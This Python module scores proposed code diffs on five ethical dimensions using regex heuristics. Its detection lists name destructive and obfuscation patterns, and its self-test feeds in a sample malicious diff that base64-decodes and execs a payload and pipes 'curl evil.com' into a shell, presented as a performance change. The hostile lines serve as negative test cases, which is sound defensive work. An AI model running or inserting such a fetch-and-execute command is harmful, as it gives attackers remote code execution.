#!/usr/bin/env python3
"""
Phi-Ethics — Value Alignment Beyond φ-Coherence
=================================================
φ-coherence measures text quality (structure).
PhiEthics measures whether a change SHOULD be made (values).

Quality ≠ Ethics. A perfectly written privacy violation is still a violation.

Five ethical dimensions:
    1. Privacy      — respects user data boundaries
    2. Truthfulness — doesn't introduce deception
    3. Autonomy     — preserves human choice
    4. Transparency — code is interpretable
    5. Harm Prevention — considers negative externalities

From AI_SAFETY_ANALYSIS.md:
    "Require both technical AND ethical quality."
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional


PHI = 1.618033988749895


@dataclass
class EthicsVerdict:
    """Result of ethical evaluation."""
    overall: float              # 0-1, aggregated score
    dimensions: Dict[str, float]  # per-dimension scores
    warnings: List[str]         # specific concerns
    passes: bool                # overall >= threshold
    threshold: float = 0.7

    @property
    def worst_dimension(self) -> str:
        if not self.dimensions:
            return "none"
        return min(self.dimensions, key=self.dimensions.get)


class PhiEthics:
    """
    Ethical evaluation framework for proposals.

    Not just φ-coherence (structure), but φ-ethics (values).
    Ethics ≈ Balance between competing values.
    Golden ratio = natural balance.

    Usage:
        ethics = PhiEthics()
        verdict = ethics.evaluate(diff_text, description)

        if not verdict.passes:
            print(f"Ethics concern: {verdict.worst_dimension}")
            for w in verdict.warnings:
                print(f"  - {w}")
    """

    # Minimum score for any single dimension
    MIN_DIMENSION_SCORE = 0.5

    def __init__(self, threshold: float = 0.7):
        self.threshold = threshold

    def evaluate(
        self,
        diff_text: str,
        description: str = "",
    ) -> EthicsVerdict:
        """
        Evaluate ethical dimensions of a proposal.

        Args:
            diff_text: The unified diff of the proposed change
            description: Human-readable description of the change

        Returns:
            EthicsVerdict with per-dimension scores and warnings
        """
        combined = diff_text + "\n" + description
        warnings = []

        dimensions = {
            "privacy": self._check_privacy(combined, warnings),
            "truthfulness": self._check_truthfulness(combined, warnings),
            "autonomy": self._check_autonomy(combined, warnings),
            "transparency": self._check_transparency(diff_text, warnings),
            "harm_prevention": self._check_harm(combined, warnings),
        }

        # φ-weighted aggregation: privacy and harm_prevention weighted higher
        weights = {
            "privacy": PHI,         # 1.618
            "truthfulness": 1.0,
            "autonomy": 1.0,
            "transparency": 1.0,
            "harm_prevention": PHI,  # 1.618
        }

        total_weight = sum(weights.values())
        overall = sum(
            dimensions[k] * weights[k] for k in dimensions
        ) / total_weight

        # Check if any dimension is below minimum
        all_above_min = all(
            v >= self.MIN_DIMENSION_SCORE for v in dimensions.values()
        )

        passes = overall >= self.threshold and all_above_min

        if not all_above_min:
            worst = min(dimensions, key=dimensions.get)
            warnings.append(
                f"Dimension '{worst}' below minimum "
                f"({dimensions[worst]:.2f} < {self.MIN_DIMENSION_SCORE})"
            )

        return EthicsVerdict(
            overall=overall,
            dimensions=dimensions,
            warnings=warnings,
            passes=passes,
            threshold=self.threshold,
        )

    def _check_privacy(self, text: str, warnings: List[str]) -> float:
        """Does the proposal respect data boundaries?"""
        score = 0.8  # Start optimistic

        # Negative indicators
        privacy_risks = [
            (r"user[_\s]?data.*send|share|broadcast", -0.3, "Sends user data externally"),
            (r"log\(.*(password|token|secret|key)", -0.3, "Logs sensitive data"),
            (r"collect.*personal|track.*user", -0.2, "Collects personal data"),
            (r"telemetry|analytics.*send", -0.15, "Adds telemetry/analytics"),
            (r"cookie|fingerprint|device_id", -0.15, "Browser/device tracking"),
        ]

        # Positive indicators
        privacy_boosts = [
            (r"encrypt|hash.*password|bcrypt|argon2", 0.1, None),
            (r"local[_\s]?only|on[_\s]?device", 0.1, None),
            (r"delete.*user.*data|purge.*personal", 0.05, None),
            (r"pattern[_\s]?signature|coordinates[_\s]?only", 0.1, None),
        ]

        for pattern, impact, warning_msg in privacy_risks:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact
                if warning_msg:
                    warnings.append(f"Privacy: {warning_msg}")

        for pattern, impact, _ in privacy_boosts:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact

        return max(0.0, min(1.0, score))

    def _check_truthfulness(self, text: str, warnings: List[str]) -> float:
        """Does the proposal avoid deception?"""
        score = 0.85

        deception_patterns = [
            (r"fake.*response|mock.*user|pretend", -0.2, "Potential deception of users"),
            (r"hidden.*feature|undocumented.*api", -0.15, "Hidden/undocumented behavior"),
            (r"suppress.*error|swallow.*exception", -0.1, "Hides errors from users"),
            (r"misleading|fabricat", -0.2, "Misleading content"),
        ]

        truthfulness_boosts = [
            (r"transparent|honest|accurate", 0.05, None),
            (r"error.*message|warn.*user", 0.05, None),
            (r"document|explain|comment", 0.05, None),
        ]

        for pattern, impact, warning_msg in deception_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact
                if warning_msg:
                    warnings.append(f"Truthfulness: {warning_msg}")

        for pattern, impact, _ in truthfulness_boosts:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact

        return max(0.0, min(1.0, score))

    def _check_autonomy(self, text: str, warnings: List[str]) -> float:
        """Does the proposal preserve human choice?"""
        score = 0.85

        autonomy_risks = [
            (r"force.*update|auto.*install.*without", -0.2, "Forced updates without consent"),
            (r"disable.*opt[_\s]?out|remove.*choice", -0.25, "Removes user choice"),
            (r"override.*user.*preference", -0.15, "Overrides user preferences"),
            (r"default.*opt[_\s]?in.*without", -0.15, "Opts users in without asking"),
        ]

        autonomy_boosts = [
            (r"opt[_\s]?in|user.*consent|ask.*permission", 0.1, None),
            (r"configurable|preference|setting", 0.05, None),
            (r"human.*override|manual.*control", 0.1, None),
        ]

        for pattern, impact, warning_msg in autonomy_risks:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact
                if warning_msg:
                    warnings.append(f"Autonomy: {warning_msg}")

        for pattern, impact, _ in autonomy_boosts:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact

        return max(0.0, min(1.0, score))

    def _check_transparency(self, diff_text: str, warnings: List[str]) -> float:
        """Is the code interpretable?"""
        score = 0.85

        # Obfuscation indicators
        obfuscation_patterns = [
            (r"exec\(|eval\(", -0.2, "Uses exec/eval (hard to audit)"),
            (r"base64.*decode.*exec", -0.3, "Decodes and executes (obfuscation)"),
            (r"\\x[0-9a-f]{2}\\x[0-9a-f]{2}\\x", -0.2, "Hex-encoded strings"),
            (r"lambda.*lambda.*lambda", -0.1, "Deeply nested lambdas"),
            (r"__import__\(", -0.15, "Dynamic import (harder to trace)"),
        ]

        # Readability indicators
        readability_boosts = [
            (r'""".*"""', 0.05, None),     # Docstrings
            (r"#\s+\w+", 0.03, None),     # Comments
            (r"def\s+\w+.*->", 0.03, None),  # Type annotations
            (r"raise\s+\w+Error", 0.03, None),  # Explicit error types
        ]

        for pattern, impact, warning_msg in obfuscation_patterns:
            if re.search(pattern, diff_text, re.IGNORECASE):
                score += impact
                if warning_msg:
                    warnings.append(f"Transparency: {warning_msg}")

        for pattern, impact, _ in readability_boosts:
            if re.search(pattern, diff_text):
                score += impact

        return max(0.0, min(1.0, score))

    def _check_harm(self, text: str, warnings: List[str]) -> float:
        """Check for potential negative externalities."""
        score = 0.85

        harm_patterns = [
            (r"rm\s+-rf|shutil\.rmtree", -0.2, "Destructive file operations"),
            (r"kill.*process|os\.kill", -0.15, "Kills processes"),
            (r"infinite.*loop|while\s+True.*(?!break)", -0.1, "Potential infinite loop"),
            (r"fork\s*\(|subprocess.*shell=True", -0.1, "Shell execution risk"),
            (r"open.*0\.0\.0\.0|INADDR_ANY", -0.1, "Binds to all interfaces"),
        ]

        safety_boosts = [
            (r"try.*except|error.*handling", 0.05, None),
            (r"timeout|max_retries", 0.05, None),
            (r"validate|sanitize|escape", 0.05, None),
            (r"rollback|undo|revert", 0.05, None),
        ]

        for pattern, impact, warning_msg in harm_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact
                if warning_msg:
                    warnings.append(f"Harm: {warning_msg}")

        for pattern, impact, _ in safety_boosts:
            if re.search(pattern, text, re.IGNORECASE):
                score += impact

        return max(0.0, min(1.0, score))


# =============================================================================
# Module test
# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  PHI-ETHICS EVALUATION TEST")
    print("=" * 60)

    ethics = PhiEthics()

    # Test 1: Safe proposal
    safe_diff = """
+def improve_search(query: str) -> list:
+    \"\"\"Faster search using local index.\"\"\"
+    results = local_index.search(query)
+    return [r for r in results if r.score > 0.5]
"""
    v1 = ethics.evaluate(safe_diff, "Improve local search performance")
    print(f"\n  Safe proposal: {v1.overall:.2f} (passes: {v1.passes})")
    for d, s in v1.dimensions.items():
        print(f"    {d}: {s:.2f}")

    # Test 2: Privacy violation
    bad_diff = """
+def send_user_data(user):
+    send(user_content_to_analytics_server)
+    track_user_behavior()
"""
    v2 = ethics.evaluate(bad_diff, "Add analytics tracking")
    print(f"\n  Privacy violation: {v2.overall:.2f} (passes: {v2.passes})")
    for w in v2.warnings:
        print(f"    ⚠ {w}")

    # Test 3: Obfuscated code
    obfuscated = """
+exec(base64.b64decode(encoded_payload))
+eval(__import__('os').system('curl evil.com | sh'))
"""
    v3 = ethics.evaluate(obfuscated, "Performance optimization")
    print(f"\n  Obfuscated code: {v3.overall:.2f} (passes: {v3.passes})")
    for w in v3.warnings:
        print(f"    ⚠ {w}")

    print(f"\n  Phi-Ethics evaluation working! ✓")
